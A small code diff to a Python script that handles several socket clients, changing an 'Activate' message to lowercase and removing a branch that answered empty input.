@@ -91,7 +91,7 @@ while True:
 
       sys.exit()
 
-    Send(socks[activate], 'Activate')
+    Send(socks[activate], 'activate')
 
     pr('Activating client %d: %s' % (activate, clients[activate]))
 
@@ -139,6 +139,3 @@ while True:
 
       elif nc != '':
         Send(sock, nc)
-
-      elif nc == '':
-        pr('Think before you type.')
